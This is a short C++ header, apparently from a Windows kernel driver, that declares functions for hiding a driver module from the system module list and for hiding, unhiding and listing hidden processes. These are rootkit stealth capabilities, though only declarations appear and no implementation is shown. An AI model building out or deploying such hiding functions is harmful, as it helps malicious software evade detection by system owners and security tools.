#pragma once
#include "helpers.h"
#pragma warning(disable : 4996)


namespace kernelobjs_hiding {
	NTSTATUS HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICODE_STRING DriverName);
	// NTSTATUS HideService(PUNICODE_STRING ServiceName);
}


namespace process {
	NTSTATUS DKHideProcess(ULONG64 ProcessId, BOOL IsStrict);
	NTSTATUS DKUnhideProcess(ULONG64 ProcessId, ULONG HiddenIndex);
	NTSTATUS DKListHiddenProcesses(ULONG64* ListSize, PVOID* ListAddress);
}